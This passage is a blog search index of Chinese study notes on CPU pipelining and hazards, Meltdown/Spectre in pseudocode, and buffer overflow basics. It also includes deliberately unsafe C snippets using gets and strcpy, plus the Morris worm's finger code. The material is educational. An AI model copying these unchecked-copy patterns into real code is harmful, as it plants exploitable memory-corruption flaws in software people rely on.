<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>多周期CPU的流水线实现</title>
      <link href="/2024/07/07/pipelineCPU/"/>
      <url>/2024/07/07/pipelineCPU/</url>
      
        <content type="html"><![CDATA[<blockquote><p>多周期CPU pipeline相关，又名计算机体系结构笔记。</p></blockquote><span id="more"></span><p>依然是在公司里做知识分享的时候写的，当时还挺喜欢小组里的这个制度的，每周都能听到一些和工作本身无关的乱七八糟的知识，虽然后来工作压力大了之后感觉大家都没有时间花心思做了。</p><p>当时选题的也是考虑到CA这门课学得好像还行，而且能和后来在信息系统安全里学到的Meltdown/Spectre攻击关联起来。</p><p>有一说一还是挺有缘的，当时信息系统安全的lab是大家分小组，然后小组里每个人再认领自己的模块做的，我刚好随到了这个和前置知识有点关系的lab，做的时候感觉也挺有意思的。</p><p>碎碎念到此结束，和这个笔记有关的<a href="https://github.com/AshenAshes/MIPS-pipeline">github项目</a>在这里，有一说一我的图画得还不错吧&lt;(￣︶￣)&gt;</p><h2 id="指令的编码与译码">指令的编码与译码</h2><p>计算机是通过执行指令来处理数据的，任何一种CPU在设计的时候，就已规定好自己特定的指令系统，通过读取符合指令系统规则的机器码，来执行和实现相应的程序功能。</p><p>从高级语言到汇编语言的编译正是在这样的指令系统基础上实现的，高级语言被编译成汇编语言的方式，取决于当前系统的指令集类型。在不同的指令集系统下，同一段高级语言编译形成的汇编语言和机器码是不一样的。</p><h3 id="常见的指令集">常见的指令集</h3><p>有两大常见的指令集类型，即CISC(复杂指令集)和RISC(精简指令集)，它们的区别在于，CISC的指令复杂度高，一条指令可能需要多个CPU周期才能完成，且指令长度不固定，很多复杂指令的使用率低，但单个指令的能力强，比如一些单个指令甚至支持乘法与除法，这在RISC指令集下是需要多条指令才能完成的功能。而RISC指令大部分功能比较简单，单个CPU周期即可完成，且指令长度固定，指令的使用率比较高。</p><p>而具体的比较常见的指令集又有以下四种：</p><ul class="lvl-0"><li class="lvl-4"><p>ARM：属于RISC指令集，几乎所有的移动设备芯片都是基于ARM架构，比如高通、苹果、联发科的芯片。其具有低功耗、低成本的特点，通常的安卓/iOS智能机处理器芯片几乎全是基于ARM架构。在桌面端，还比较少见，但苹果也推出了基于ARM架构的M1芯片。</p></li><li class="lvl-4"><p>x86：属于CISC指令集，几乎在桌面端和服务器端达到了统治级别的地位。功能强大，代表厂商有Intel、AMD。Windows与Intel的联合，也使得x86架构在win生态下的地位几乎无可撼动。</p></li><li class="lvl-4"><p>MIPS：属于RISC指令集，最早是在80年代初期由斯坦福大学的研究小组所开发的。因其设计简洁易懂，所以经常被引用于大学计算机设计的教材中。但商业化进程远不如ARM与x86，一般应用于各类嵌入式设备中。中科院自主研发的龙芯，其LoongISA指令集同样基于MIPS发展而来。</p></li><li class="lvl-4"><p>RISC-V：属于RISC指令集，近年来异军突起的新兴指令集架构，在2014年才发布。与前三个指令集因商业化的性质需要收费不同，RISC-V选择了开源、永久免费。</p></li></ul><p>值得一提的是，MIPS的创始人John Hennessy和RISC-V之父Dave Patterson渊源颇深。 两人合作撰写了2本现在被广泛用于本科生、研究生课程的教科书：《计算机组成与设计：硬件/软件接口》和《计算机体系结构：量化研究方法》，书中涉及了MIPS和RISC-V指令集相关的计算机设计。2017年，两人一起获得了当年的图灵奖。</p><h3 id="编译过程">编译过程</h3><h4 id="高级语言-汇编语言">高级语言-&gt;汇编语言</h4><p>以下展示了同一段C代码在不同指令集架构下编译生成的不同汇编代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//C语言</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>n<span class="token punctuation">;</span>i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mips" data-language="mips"><code class="language-mips">;MIPS指令集Loop:    ...    addi  $t0, $t0, -1  ;$t0&#x3D;$t0-1    bne   $t0, $zero, Loop  ;if $t0 !&#x3D; 0 go to Loop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">;x86指令集Loop:    ...    dec  $rax  ;$rax &#x3D; $rax-1    test $rax, $rax ;if $rax&#x3D;0, set Zero Flag(ZF) &#x3D; 1    jnz Loop   ;if Zero Flag(ZF) !&#x3D; 0 go to loop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于指令集的不同，在不同架构下编译生成的汇编语言不同，最后所形成的机器码也就不一致。</p><h4 id="汇编语言-机器码">汇编语言-&gt;机器码</h4><p>指令集可以看作是对机器码的解析或者生成规则，计算机以二进制01的形式存储数据，如果没有一个约定俗称的编码和译码方式，那么这些01数据就会变得对人类来说难以阅读和使用。</p><p>ARM和MIPS指令集的差异：</p><p><img src="/2024/07/07/pipelineCPU/1720335631019.png" alt=""></p><p>根据这样的规则，我们就可以将如下的MIPS指令译码成计算机可理解的机器码</p><pre class="line-numbers language-mips" data-language="mips"><code class="language-mips">;MIPS指令add $t0, $s2, $t0;属于寄存器-寄存器规则000000 10010 01000 01000 00000 100000 &#x2F;&#x2F;32 bits  op    rs    rt    rd   shamt  functOp:指令的解析类型Rs:第一个寄存器操作数Rt:第二个寄存器操作数Rd:保存结果的寄存器Shamt:地址偏移量Funct:指令符号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/07/07/pipelineCPU/1720336052381.png" alt=""></p><p>同理，计算机CPU也根据这样的规则，将机器码译码，并执行相应的操作。</p><h4 id="程序的执行">程序的执行</h4><p>一个程序的执行，正是通过计算机读取这一行行的机器码，并根据当前系统的指令集类型，解析出相应的指令，并进行对应的寄存器读取、计算、内存读写等操作。</p><p><img src="/2024/07/07/pipelineCPU/1720336086130.png" alt=""></p><p>在一个经典的CPU架构中，程序计数器PC指向了指令的内存地址，CPU根据PC指向的地址在内存中读取指令，并将读取到的指令进行译码(也就是我们上述所说的计算机根据op类型去解析指令)，解析出的指令会包含指令操作码与指令操作数，操作码指示了指令应完成何种操作，而操作数则提供了参与运算的数据、读写地址等相关信息。将解析出的内容传递给操作控制器，它会根据指令内容进行相应的操作。</p><p>对于MIPS指令集而言，常见的指令类型主要分为以下几种：</p><p><img src="/2024/07/07/pipelineCPU/1720336261314.png" alt=""></p><p>举个栗子，一个add指令是如何在CPU中被解析并执行的：</p><ol><li class="lvl-4"><p>PC存储了当前要执行的指令地址addr，CPU到addr这个地址取到了一串机器码，这串机器码为：00000010010010000100000000100000</p></li><li class="lvl-4"><p>CPU开始译码，首先读取前六位000000，这代表了指令类型，000000说明该指令是一个R型指令，R型指令的解析规则如下：</p></li></ol><p><img src="/2024/07/07/pipelineCPU/1720336298267.png" alt=""></p><ol start="3"><li class="lvl-4"><p>根据该解析规则，CPU成功译码出了如下内容：</p></li></ol><pre class="line-numbers language-none"><code class="language-none">000000 10010 01000 01000 00000 100000  op    rs    rt    rd   shamt  funct<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li class="lvl-4"><p>根据R型指令的规则，rs和rt代表了要读取的寄存器编号，funct代表要对这两个寄存器进行运算的运算类型，（shamt在移位指令中会用到，这里不考虑）。假设$rs=1，$rt=2，那么CPU会首先读取这两个寄存器中的内容1和2，然后给<strong>运算单元ALU</strong>作为输入。</p></li><li class="lvl-4"><p>这里的funct=100000代表了加操作，<strong>运算单元ALU</strong>进行加法计算，得到结果3</p></li><li class="lvl-4"><p>rd代表了结果存储的目的寄存器，运算结果3会被写入寄存器rd中，至此，该指令操作结束</p></li></ol><h2 id="单周期CPU">单周期CPU</h2><p>举例的add操作是一个顺序执行的流程，并且分点之间不能并行执行，我们可以提炼出一个R型运算指令执行顺序的模型。</p><ol><li class="lvl-4"><p>读指令</p></li><li class="lvl-4"><p>译码并读寄存器</p></li><li class="lvl-4"><p>运算操作</p></li><li class="lvl-4"><p>回写寄存器</p></li></ol><p>假设每一步都花费一个单位时间，那么执行一个add指令，就需要4个单位时间。</p><p>由于各个指令的复杂性不同，所要花费的时间是不一致的。如果是简单的J型指令（指令地址跳转），只需要花费3个单位时间：</p><p><img src="/2024/07/07/pipelineCPU/1720336392968.png" alt=""></p><ol><li class="lvl-4"><p>读指令</p></li><li class="lvl-4"><p>译码并计算指令跳转地址</p></li><li class="lvl-4"><p>将跳转地址传递给PC</p></li></ol><p>而一些复杂的I型指令，比如内存读取相关的lw（读一个内存地址中的内容并存储到一个寄存器中），则需要花费5个单位时间：</p><p><img src="/2024/07/07/pipelineCPU/1720337309346.png" alt=""></p><ol><li class="lvl-4"><p>读指令</p></li><li class="lvl-4"><p>译码并读寄存器</p></li><li class="lvl-4"><p>计算内存地址 ALU</p></li><li class="lvl-4"><p>读内存</p></li><li class="lvl-4"><p>回写寄存器</p></li></ol><p>计算机所有的操作都是以时钟周期为单位的，一个时钟周期内进行一个操作，而时钟周期的长度是固定的。如何确定计算机的时钟周期长度？由于指令是顺序执行的，并且指令间可能存在读写冲突，我们不能调换或者并行执行指令，所以我们可以以一个指令的执行时间作为一个时钟周期。</p><p>那么在上述情况中，以最复杂的指令的执行时间作为一个时钟周期，就能确保所有的指令都能在一个时钟周期内执行完成。这一个时钟周期就是5个单位时间，这种CPU就被称作是单周期CPU。它的时钟周期是以一个指令级别的长度来确定的。</p><p><img src="/2024/07/07/pipelineCPU/1720336449201.png" alt=""></p><p><img src="/2024/07/07/pipelineCPU/1720336477363.png" alt=""></p><p>显而易见地，这样的CPU执行效率很低，因为它在执行简单指令时，也需要花费相当于复杂指令的执行时间。</p><h2 id="多周期CPU">多周期CPU</h2><p>在之前，我们已经对指令进行了单位时间级别的划分，那么我们可以直接把一个单位时间作为一个时钟周期，指令的每一小步都花费一个时钟周期。共有的时钟周期越小，单位时间内CPU所能执行的操作量就越大。这样的CPU被称作是多周期CPU，它的时钟周期是以一个指令内操作执行时间的级别来确定的。</p><p>为何确认这样的时间长度作为一个时钟周期？</p><p>多周期CPU的时钟周期不能太长，否则它的执行效率和单周期CPU没有区别。</p><p>多周期CPU的时钟周期不能太短，否则一个基础操作也要花费多个时钟周期完成，调度的开销成本会上升。</p><h3 id="流水线">流水线</h3><p>事实上，一个MIPS指令通常会经历下面5个流程：</p><ol><li class="lvl-4"><p>从指令存储器中读取指令</p></li><li class="lvl-4"><p>指令译码并同时读取寄存器</p></li><li class="lvl-4"><p>执行操作或计算地址</p></li><li class="lvl-4"><p>读/写数据存储器</p></li><li class="lvl-4"><p>将结果写回寄存器</p></li></ol><p>这与我们之前的划分相类似，为了降低管线的复杂度，我们可以假定每一条指令都处于这样的一个流程中，每一个时钟周期，执行一步流程。这样划分的好处还有，我们不必等待一条指令完整执行完成再执行下一条指令，当指令A处于流程2时，它的下一条指令也可以开始进入流程1开始执行。这样的思想就被称作是流水线（pipeline）。</p><p>以图的形式表示，单周期和多周期流水线CPU的区别如下：</p><p><img src="/2024/07/07/pipelineCPU/1720336505189.png" alt=""></p><p>可以看到，多周期流水线执行下，总体花费时间相较于单周期CPU大大缩短。</p><h3 id="冒险">冒险</h3><p>虽然流水线的指令执行方式大大提高了CPU的执行效率，但也引入了一定的风险。在单周期CPU中提到过，指令间可能存在读写冲突，所以单周期CPU的选择是指令串行执行，如果按流水线的方式执行，显然会引入这种风险。这种情况被称作是流水线冒险。</p><h4 id="结构冒险">结构冒险</h4><p>读写操作会发生在指令执行过程中接触到的两个结构，即存储器和寄存器。</p><p>流水线中，在第一阶段的取指令中会读取存储器，在第四阶段中会读/写存储器。为了规避这种冒险，流水线中将存储器分为了指令存储器和数据存储器，规避了读写冲突。</p><p>至于寄存器，在第二阶段会读取寄存器，在第五阶段会回写寄存器，这种冒险无法像存储器那样解决，因为两阶段读写的寄存器可能会是同一个。但是，由于对寄存器的访问速度会明显快于对存储器的访问，一般来说，一个时钟周期内可以支持进行多次寄存器的读写，所以我们可以将写寄存器的操作放在时钟周期的前半段进行，将读寄存器的操作放在时钟周期的后半段进行。</p><p><img src="/2024/07/07/pipelineCPU/1720336532159.png" alt=""></p><h4 id="数据冒险">数据冒险</h4><p>数据冒险指的是一条指令依赖于它之前的还在流水线中的指令的数据，比如在下面这种case中，第二条指令要读的寄存器与第一条指令要写的寄存器是同一个，但当第二条指令执行到第二阶段时，第一条指令应写入的数据还未写入相应的寄存器，这时候读寄存器读到的就是错误的数据。</p><p><img src="/2024/07/07/pipelineCPU/1720336573617.png" alt=""></p><p>这种时候，必须暂缓第二条指令的执行，在第一与第二条指令间插入两个空指令，来暂缓读取操作的执行。等到第一条指令将数据写入对应寄存器中时，再执行第二条指令的读取操作。这两个空指令一般被称作bubble（气泡）。</p><p><img src="/2024/07/07/pipelineCPU/1720336666002.png" alt=""></p><p><img src="/2024/07/07/pipelineCPU/1720336675707.png" alt=""></p><h4 id="分支冒险">分支冒险</h4><p>分支冒险的产生与一些分支指令or地址跳转指令有关，指令的执行顺序由于分支产生或者地址跳转产生而变得不确定，在高级语言中，通常表现为if-else的分支和一些代码的jump操作，导致代码的执行顺序变得不确定。而在我们的MIPS流水线中，则是由于分支指令beq、bne等和一些跳转指令j、jr等所导致的。</p><p>下一步要执行哪个指令，需要等到分支指令决定执行哪一个分支or跳转指令计算出跳转地址，才可以确定。这会产生一个阶段的bubble阻塞。</p><p><img src="/2024/07/07/pipelineCPU/1720336725576.png" alt=""></p><h3 id="优化">优化</h3><p>实际CPU运行中，由于顺序执行的代码间大多存在逻辑关系，顺序执行的指令间会产生大量的数据冒险，或者由于代码间大量的分支或者跳转产生分支冒险，进而产生bubble，这严重阻碍了CPU的运行，导致CPU浪费了大量时间在bubble上。如何减少bubble的产生，是流水线CPU的一个优化方向。</p><h4 id="数据冒险：前推">数据冒险：前推</h4><p>前推指的是，将发生数据冒险时前面指令要写的数据提前给后面的指令（此时寄存器的新数据已经产生，只是还未写入寄存器），这条传递数据的通路就被称作是前推，也叫旁路。</p><p>通常有三种前推的情况：</p><ol><li class="lvl-4"><p>处于ID阶段的指令要读的寄存器与处于EXE阶段的指令要写的寄存器是同一个，且处于EXE阶段的指令不是lw（读取内存数据并写寄存器），这时候ID阶段要读的内容其实就是现在EXE阶段里运算单元的输出结果。这里建立了一条从EXE输出到ID读取输出的通路。</p></li></ol><p><img src="/2024/07/07/pipelineCPU/1720336763179.png" alt=""></p><ol start="2"><li class="lvl-4"><p>处于ID阶段的指令要读的寄存器与处于MEM阶段的指令要写的寄存器是同一个，且处于MEM阶段的指令不是lw（读取内存数据并写寄存器），这时候ID阶段要读的内容其实就是现在MEM阶段的传入数据，这个数据在EXE阶段就已经计算好了，只是现在被传递到了MEM阶段。这里建立了一条从MEM输入到ID读取输出的通路。</p></li></ol><p><img src="/2024/07/07/pipelineCPU/1720336785709.png" alt=""></p><ol start="3"><li class="lvl-4"><p>处于ID阶段的指令要读的寄存器与处于MEM阶段的指令要写的寄存器是同一个，且处于MEM阶段的指令是lw（读取内存数据并写寄存器），这时候ID阶段要读的内容其实就是现在MEM阶段从存储器读取的数据。这里建立了一条从MEM输出到ID读取输出的通路。</p></li></ol><p><img src="/2024/07/07/pipelineCPU/1720336825182.png" alt=""></p><p>至此，我们优化了大部分会产生bubble的情况，使得流水线能正常运行而不停滞。现在只剩下一种情况还会产生bubble，那就是：</p><p>处于ID阶段的指令要读的寄存器与处于EXE阶段的指令要写的寄存器是同一个，且处于MEM阶段的指令是lw（读取内存数据并写寄存器）。这时候后面的指令要读取的新数据还未产生，要等处于EXE阶段的指令执行完存储器数据读取的操作，才能获取到最新值，这种情况下，流水线会产生一个阶段的bubble。将这种情况变为前推路线的第三种情况：</p><p><img src="/2024/07/07/pipelineCPU/1720336843008.png" alt=""></p><h4 id="分支冒险：预测">分支冒险：预测</h4><p>对于无条件跳转的指令，我们只能等待跳转地址计算完成，所以这种情况是一定会产生一个bubble的。</p><p>但对于分支指令，会有跳转与不跳转的情况，我们可以预测分支指令的跳转结果。比如预测它不发生跳转，它的下一条指令就是指令存储器中的下一条指令，假如预测正确，我们就规避了一个bubble的产生，假如预测错误，清空下一条指令的执行，并将下下条指令置为跳转指令，这样也只产生了一个bubble，情况没有变得更坏。</p><p><img src="/2024/07/07/pipelineCPU/1720336864015.png" alt=""></p><p>在更高级的CPU预测执行中，我们可以动态地预测指令，即预测一部分指令跳转，预测另一部分指令不跳转。比如对于循环体结构，我们往往预测发生跳转，且跳转到循环体的顶部。</p><p>至此，多周期流水线CPU的基本概念与思想大致都解释了。以下是一个流水线CPU结构的概略图，并没有覆盖所有通路细节：</p><p><img src="/2024/07/07/pipelineCPU/1720336892261.png" alt=""></p><p>我画的一个多周期CPU通路图（有点乱，见谅）：</p><p><img src="/2024/07/07/pipelineCPU/1720336971684.png" alt=""></p><h3 id="高级流水线技术">高级流水线技术</h3><ul class="lvl-0"><li class="lvl-2"><p>指令级并行：流水线架构本身就是一种指令级并行，本次我们划分了五级流水线。通过增加流水线的深度以重叠更多的指令，可以进一步增加指令级并行的程度。</p></li><li class="lvl-2"><p>多发射：复制CPU内部组件的数量，使得每个流水级可以执行多条指令，一般实现方式有静态多发射和动态多发射。</p><ul class="lvl-2"><li class="lvl-6">静态多发射：在编译阶段就决策哪些指令进行多发射</li></ul><p><img src="/2024/07/07/pipelineCPU/1720336990862.png" alt=""></p><ul class="lvl-2"><li class="lvl-6"><p>动态多发射：CPU在执行阶段决定多发射哪些指令</p><ul class="lvl-4"><li class="lvl-10"><p>超标量：使每个周期处理器能执行的指令数超过一条</p></li><li class="lvl-10"><p>动态流水线调度：对指令进行重排序以避免阻塞的硬件支持</p></li></ul></li></ul></li></ul><p>这些以及其他高级流水线技术的具体实现在《计算机体系结构：量化研究方法》有更详细的解释，感兴趣可以阅读。</p><h4 id="CPU实例">CPU实例</h4><p><strong>Intel Core i7 920</strong></p><p>属于x86架构，具有14级流水线，使用了动态多发射、乱序执行和推测执行的动态流水线调度技术。</p><p><img src="/2024/07/07/pipelineCPU/1720337018521.png" alt=""></p><h2 id="安全风险">安全风险</h2><h3 id="CPU芯片漏洞：Meltdown-Spectre攻击">CPU芯片漏洞：Meltdown&amp;Spectre攻击</h3><p>我们通常认为计算机处理器就是一台完全有序的机器，执行着一条条简单的指令。但事实是，数十年来，它们的运行方式都是无序的，是在猜测下一步应该是什么。在过去大约25年的时间里，大多数计算能力的提升都依赖这种被称为“推测执行”的功能。但是2018年1月3日，人们发现，这种为现代计算做出了巨大贡献的技术却成了最大的漏洞之一。</p><p>2017年期间，Cyberus Technology公司、谷歌零点项目、格拉茨技术大学、Rambus公司、阿德莱德大学及宾夕法尼亚大学的研究员们，以及密码技术人员保罗•克奇等独立研究人员，分别发现了<strong>利用推测执行进行黑客攻击</strong>的方式。</p><p>名为Meltdown和Spectre的这些类型的攻击绝非一般故障。最初被发现的时候，Meltdown能够攻击所有的英特尔x86微处理器、所有的IBM Power处理器以及部分ARM处理器。Spectre及其多种变体的攻击范围还包括超威半导体（AMD）的处理器。也就是说，几乎全世界所有的计算都容易遭到攻击。</p><p>Meltdown攻击是一种直接针对底层硬件机制（CPU的乱序执行机制、Cache机制和异常处理机制）的时间侧信道攻击，攻击原理如下：</p><p><img src="/2024/07/07/pipelineCPU/1720337120190.png" alt=""></p><p>这一段顺序执行的代码可用伪代码表示如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>鉴权并访问内核地址中的数据secret<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    temp <span class="token operator">=</span> secret<span class="token operator">*</span><span class="token number">1024</span><span class="token operator">+</span><span class="token number">2048</span>    访问数组array<span class="token punctuation">[</span>temp<span class="token punctuation">]</span>并重置它的值为n<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料">参考资料</h2><ol><li class="lvl-4"><p><a href="https://ee.ofweek.com/2021-06/ART-8320315-11000-30502562_1.html">X86 / ARM / RISC－V / MIPS四大主流指令集架构有何特点</a></p></li><li class="lvl-4"><p>《计算机组成与设计：硬件/软件接口》J.L.Hennessy &amp; D.A.Patterson</p></li><li class="lvl-4"><p>SEED Labs</p><ol><li class="lvl-8"><p>https://seedsecuritylabs.org/Labs_20.04/System/Meltdown_Attack/</p></li><li class="lvl-8"><p>https://seedsecuritylabs.org/Labs_20.04/System/Spectre_Attack/</p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIPS </tag>
            
            <tag> CPU </tag>
            
            <tag> 硬件 </tag>
            
            <tag> Computer Architecture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Security Note(2) | ROP</title>
      <link href="/2020/07/22/SoftwareSecurity2/"/>
      <url>/2020/07/22/SoftwareSecurity2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> ROP </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Security Note(1) | Buffer Overflow</title>
      <link href="/2020/07/18/SoftwareSecurity1/"/>
      <url>/2020/07/18/SoftwareSecurity1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>少年心性岁岁长，何必虚掷惊和慌。<br>皆是我曾途径路，不过两鬓雪与霜。</p></blockquote><span id="more"></span><p>原文是几年前写的栈溢出那一节课和作业的整理，后来公司里做知识分享的时候顺便拿来用了，当时重写了一遍，感觉重写后的更清楚，把原理和HW放在一起了。</p><p>以下是原文的引言：</p><p>是对这学期上的Software Security课程的一个整理，讲道理上课的时候听的不是很认真，但是感觉这门课还是很值得复盘整理一下的，于是写了这个系列的note，希望我能早点更完。一些依托于助教的虚拟机的服务器端的HW就没法复现了，可惜。</p><p>这个<a href="https://github.com/AshenAshes/Software-Security">github</a>是和这个项目一起的。</p><h2 id="概念">概念</h2><p>Buffer Overflow，即缓冲区溢出。在存在缓存溢出安全漏洞的计算机中，攻击者可以用超出常规长度的字符数来填满一个域，通常是内存区地址。在某些情况下，这些过量的字符能够作为“可执行”代码来运行。从而使得攻击者可以不受安全措施的约束来控制被攻击的计算机。</p><p>C语言中存在很多有安全漏洞的库函数，由于不进行边界检查，存在着buffer overflow的风险：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//buffer overflow</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//buffer overflow</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">//buffer overflow</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//buffer overflow</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是一些典型的会造成buffer overflow的例子。</p><h2 id="历史上的一些Buffer-Overflow攻击">历史上的一些Buffer Overflow攻击</h2><h3 id="Morris蠕虫">Morris蠕虫</h3><p>1988年，美国康奈尔大学一年级研究生罗伯特·莫里斯编写了一个只有99行的程序，它利用了Unix系统中的缺点，用Finger命令查联机用户名单，然后破译用户口令，用Mail系统复制、传播本身的源程序，再编译生成代码。这次攻击造成了当时数千台计算机瘫痪，损失近亿美元。</p><p>Morris蠕虫利用到了当时finger进程的一个漏洞，finger命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。当时，用于进行finger服务的远程计算机进程,使用了标准C库函数<strong>gets</strong>。gets函数的作用是从输入流中读入一个字符串，但是gets()函数并不检查缓冲区的空间，事实上它也无法检查缓冲区的空间。如果函数的调用者提供了一个指向堆栈的指针，并且gets函数读入的字符数量超过了缓冲区的空间，gets()函数就会将多出来的字符继续写入到堆栈中,这就覆盖了堆栈原先的内容。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//finger进程包含下列代码</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    …    <span class="token function">gets</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//会造成buffer overflow</span>    …<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过覆盖堆栈的内容，攻击者可以借此植入恶意代码并改变程序的控制流，使得其开始执行恶意代码。Morris蠕虫通过这种方式获得shell权限并替代正在运行的程序，然后向网络中的其他计算机继续发起finger请求，以感染其他更多的计算机。</p><h3 id="Heartbleed漏洞">Heartbleed漏洞</h3><p>Heartbleed(心脏出血)，是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。它于2012年被引入了软件中，2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。此问题的原因是在实现TLS的heartbeat请求时没有对输入进行适当验证（缺少边界检查）。</p><p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><p>良性请求:</p><p><img src="/2020/07/18/SoftwareSecurity1/1720268910844.png" alt=""></p><p>恶性请求：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720268920310.png" alt=""></p><h2 id="基础知识">基础知识</h2><p>我们一般通过覆盖栈内存来利用buffer overflow进行attack。先讲一些涉及到的基础知识。</p><h3 id="程序内存布局">程序内存布局</h3><p>一个程序的内存布局及其存放内容：</p><p>(高地址)</p><ul class="lvl-0"><li class="lvl-2"><p>Stack： 局部变量、返回地址、参数…</p></li><li class="lvl-2"><p>Heap：动态内存分配</p></li><li class="lvl-2"><p>BSS：未初始化的static/global变量</p></li><li class="lvl-2"><p>Data segment：已初始化的static/global的变量</p></li><li class="lvl-2"><p>Text segment：程序的code</p></li></ul><p>(低地址)</p><p><img src="/2020/07/18/SoftwareSecurity1/1720264601532.png" alt="" width="300"></p><h3 id="栈内存布局">栈内存布局</h3><p>这样的程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>    x<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span> y<span class="token operator">=</span>a<span class="token operator">-</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main调用函数func时，栈会为此次函数调用在栈顶分配一块内存，依次压入：</p><ul class="lvl-0"><li class="lvl-2"><p>Arguments 参数，从右往左</p></li><li class="lvl-2"><p>Return address 函数的返回地址，即该函数执行完成后要执行的下一条指令的地址</p></li><li class="lvl-2"><p>Previous frame pointer(ebp) 上一个stack frame(栈帧)的帧指针</p></li><li class="lvl-2"><p>Local varibles 函数内的一些局部变量</p></li></ul><p>如下图所示：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265457189.png" alt="" 